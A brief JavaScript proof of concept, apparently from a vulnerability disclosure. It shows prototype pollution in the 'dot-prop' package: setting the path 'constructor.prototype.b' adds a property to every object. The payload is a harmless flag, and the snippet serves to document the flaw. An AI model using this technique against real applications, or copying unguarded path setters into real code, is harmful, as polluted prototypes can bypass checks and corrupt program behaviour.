const dotProp = require("dot-prop")
const object = {};
console.log("Before " + object.b); //Undefined
dotProp.set(object, 'constructor.prototype.b', true);
console.log("After " + {}.b); //true
